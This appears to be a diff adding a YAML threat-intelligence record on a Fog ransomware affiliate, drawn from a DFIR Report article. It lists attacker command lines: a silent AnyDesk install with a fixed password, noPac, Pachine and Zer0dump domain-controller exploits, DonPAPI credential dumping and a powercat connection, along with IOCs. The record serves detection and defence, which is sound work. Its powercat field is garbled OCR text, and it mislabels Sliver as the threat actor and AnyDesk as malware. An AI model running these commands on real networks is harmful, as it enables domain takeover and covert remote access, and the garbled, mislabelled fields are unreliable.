@@ -1,0 +1,159 @@
+description: This report details observed tactics, techniques, and procedures (TTPs)
+  associated with a threat actor utilizing various tools including Proxychains, Certipy,
+  Impacket, Sliver, Powercat, noPac, DonPAPI, and others. The adversary leverages
+  these tools for reconnaissance, lateral movement, credential access, and potential
+  data exfiltration.
+date: '2025-04-28'
+authors:
+- Angelo_Violetti
+- Zach Stanford
+attribution:
+  threat_actor: Sliver
+malware_families:
+- Fog Ransomware
+- Sliver
+- AnyDesk
+- ZerOdump
+- Pachine
+- noPac
+- DonPAPI
+- Orpheus
+TTPs:
+  processes:
+  - netextender
+  - Nmap
+  - SonicWall Scanner
+  - DonPAPI
+  - Impacket dpapi
+  - Certipy
+  - Orpheus
+  - Zer0dump
+  - Pachine
+  - noPac
+  - AnyDesk
+  - Powercat
+  - Proxychains
+  - python3
+  - proxychains
+  - git
+  - sudo
+  - apt
+  - certipy
+  - nx
+  - powercat
+  - scanner.py
+  - noPac.py
+  - pachine.py
+  - sonic_scan/main.py
+  commandline:
+  - netextender <target IP address> username <target username> password <username
+    password> domain <target domain name>
+  - cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win
+    --silent
+  - cmd.exe /c echo Admin#123 | C:\\ProgramData\\anydesk.exe --set-password
+  - python3 DonPAPI.py -pvk <pvk name>.pvk --no_vnc --no_remoteops --GetHashes --no_recent
+    --no_sysadmins -o
+  - certipy find -u
+  - python3 zeredump.py 192.168.1.227
+  - python3 pachine.py -dc-host
+  - python3 scanner.py -dc-ip 192.168.1.227
+  - python3 noPac.py -dc-ip 192.168.1.227 -dc-host
+  - proxychains python3 noPac.py
+  - git clone https://github.com/Ridter/noPac
+  - sudo apt install proxychains
+  - sudo nano /etc/proxychains.conf
+  - certipy find -u -pp
+  - git clone https://github.com/bbe@/zeredump.git
+  - python3 noPac.py
+  - -use-ldap
+  - --impersonate-shell
+  - --impersonateadministrator
+  - powercat -c -p 443
+  powershell:
+  - mkdir "C:\\ProgramData\\AnyDesk"
+  - '"(new-object System.Net.WebClient).DownloadFile(''http://download.anydesk.com/AnyDesk.exe'',
+    ''C:\\ProgramData\\AnyDesk.exe'')"'
+  - cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win
+    --silent
+  - cmd.exe /c echo Admin#123 | C:\\ProgramData\\anydesk.exe --set-password
+  - 'function powercat{param([alias(\"Client\")][string]$c=\"\",[alias(\"Listen\")][switch]$1=$False,[alias(\"Port\")][Parameter(Position=-1)][string]$p=\"\",[alias(\"Execute\")][string]$e=\"\",[alias(\"ExecutePowershell)][switch]$ep=$False,[alias(\"Relay\")][string]$r=\"\",[alias(\"UDP\")][switch]$u=$False,[alias(\"dnscat2\")][string]$dns=\"\",[alias(\"DNSFailureThreshold\")][int32]$dnsft=10,[alias(\"Timeout\")][int32]$t=60,[Parameter(ValueFromPipeline=$True)][alias(\"Input\")]$i=$null,[ValidateSet(''Host'',
+    ''Bytes'', ''String'')][alias(\"OutputType\")][string]$o=\"Host\",[alias(\\"OutputFile\\")][string]$of=\"",[alias(\"Disconnect\")][switch]$d=$False,[alias(\"Repeater\")][switch]$rep=$False,[alias(\"GeneratePayload\")][switch]$g=$False,[alias(\"GenerateEncoded)][switch]$ge=$False,[alias(\"Help\")][switch]$h=$FalseFEHRHHHEEEREREE
+    HELP #HHEHREEREHR$Help = \"powercat - Netcat, The Powershell VersionGithub Repository:
+    https://github.com/besimorhino/powercatThis script attempts to implement the features
+    of netcat in a powershellscript. It also contains extra features such as built-in
+    relays, executepowershell, and a dnscat2 client.Usage: powercat [-c or -1] [-p
+    port] [options]sonic_scan/main.pyAdversary any.pslAnyDeskFog Ransomware Affiliate
+    ZerOdumpPachinenoPacDonPAPI194.48.154.79  Sliver m Capabilities/TTPs ImpacketCertipyOrpheusNetExecSliverPowercatProxychainsFog
+    RansomwareGeographic Industryc  o o 0ltaly Greece USA Brazil Technology Education
+    Retail Transportation & LogisticsToolsTechniqueExploited Vulnerabilitiessonic_scan/mainpyValid
+    Accounts - T1078Anydesk  anypsl | Windows Service - T1543003Zer0dump Exploitation
+    for Privilege Escalation - T1068 CVE-2020-1472Pachine CVE-2021-42278noPac CVE-2021-42287DonPAPI
+    Credentials from Password Stores - TI555Impacket Steal or Forge Authentication
+    Certificates - T1649Certipy Kerberoasting - T1558.003OrpheusNetExec SMB/Windows
+    Admin Shares - T1021.002Sliver Proxy - T1090Powercat Web Protocols - TI071001ProxychainsProtocol
+    Tunneling - T1572Fog RansomwareData Encrypted for Impact - T1486
+
+    '
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: python3
+    destination_address: 192.168.1.227
+  - executable: certipy
+    destination_address: 192.168.1.227
+  file_modifications:
+  - .bash_history
+  - .bashrc
+  - .cache/
+  - .config/
+  - .gnupg/
+  - .local/
+  - .nxc/
+  - .profile
+  - .sliver/
+  - .sliver-client/
+  - .ssh/
+  - .wget-hsts
+  - .Xauthority
+  - .xorgxrdp.10.log
+  - .xsession-errors
+  - 20241121150831_Certipy.zip
+  - any.ps1
+  - AnyDesk.exe
+  - Certipy/
+  - Desktop/
+  - Documents/
+  - DonPAPI-1.0.0/
+  - Downloads/
+  - Music/
+  - noPac/
+  - orpheus/
+  - ouroverde.net.br/
+  - Pachine/
+  - Pictures/
+  - powercat.ps1
+  - Public/
+  - sliver-client_linux
+  - sliver-client_linux.sig
+  - sliver-server
+  - sliver-server_linux.sig
+  - slv.bin
+  - snap/
+  - sonic_scan/
+  - sonic_scan.zip
+  - Templates/
+  - thinclient_drives/
+  - v1.0.0.zip
+  - Videos/
+  - zer0dump/
+  persistence:
+  - AnyDesk automated via PowerShell script with preconfigured remote access credentials.
+  - Windows Service (AnyDesk)
+  pipes: []
+  process_relations: []
+IOCs:
+- 194.48.154.79
+- ouroverde.net.br
+- ip_address: 194.48.154.79
+reference: https://thedfirreport.com/2025/04/28/navigating-through-the-fog/
+file_creation_date: May 14, 2025
